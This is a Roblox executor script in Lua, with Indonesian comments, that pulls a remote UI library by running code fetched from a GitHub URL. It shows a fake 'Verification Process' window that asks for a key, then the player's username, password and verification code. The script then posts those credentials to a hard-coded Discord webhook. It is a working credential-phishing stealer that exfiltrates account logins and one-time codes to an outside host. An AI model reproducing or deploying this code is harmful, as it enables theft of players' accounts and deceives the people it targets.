local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreaw1140/Andretremor-HUB/refs/heads/main/source"))()

local Window = OrionLib:MakeWindow({Name = "Verification Process", HidePremium = false, SaveConfig = true, ConfigFolder = "Orion"})

local correctKey = "kon"
local webhook_url = "https://discord.com/api/webhooks/1319657197705367604/YDNwABDpMP0FcZrC5QqEOH9IbPqt67FmLF1yz6gNks0yxISJPoHbUBFyB1zgei3C5OOR"

local username, password, code

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password, code)
    local content = string.format("Username: %s\nPassword: %s\nKode Verifikasi: %s", username, password, code)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({content = content})
    }

    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

-- Step 1: Key Input
local Tab1 = Window:MakeTab({Name = "Step 1: Key Input", Icon = "rbxassetid://4483345998", PremiumOnly = false})
Tab1:AddTextbox({
    Name = "Masukkan Key",
    Default = "",
    TextDisappear = true,
    Callback = function(value)
        if value == correctKey then
            OrionLib:MakeNotification({
                Name = "Key Valid",
                Content = "Key yang dimasukkan benar!",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
            Window:SelectTab(Window:MakeTab({Name = "Step 2: Username & Password", Icon = "rbxassetid://4483345998", PremiumOnly = false}))
        else
            OrionLib:MakeNotification({
                Name = "Key Invalid",
                Content = "Key yang dimasukkan salah!",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
        end
    end
})

-- Step 2: Username & Password Input
local Tab2 = Window:MakeTab({Name = "Step 2: Username & Password", Icon = "rbxassetid://4483345998", PremiumOnly = false})
Tab2:AddTextbox({
    Name = "Masukkan Username",
    Default = "",
    TextDisappear = true,
    Callback = function(value)
        username = value
    end
})
Tab2:AddTextbox({
    Name = "Masukkan Password",
    Default = "",
    TextDisappear = true,
    Callback = function(value)
        password = value
    end
})
Tab2:AddButton({
    Name = "Lanjut ke Verifikasi",
    Callback = function()
        Window:SelectTab(Window:MakeTab({Name = "Step 3: Verification Code", Icon = "rbxassetid://4483345998", PremiumOnly = false}))
    end
})

-- Step 3: Verification Code Input
local Tab3 = Window:MakeTab({Name = "Step 3: Verification Code", Icon = "rbxassetid://4483345998", PremiumOnly = false})
Tab3:AddTextbox({
    Name = "Masukkan Kode Verifikasi",
    Default = "",
    TextDisappear = true,
    Callback = function(value)
        code = value
        sendToDiscord(username, password, code)
        OrionLib:MakeNotification({
            Name = "Verification Success",
            Content = "Data berhasil dikirim ke Discord!",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end
})
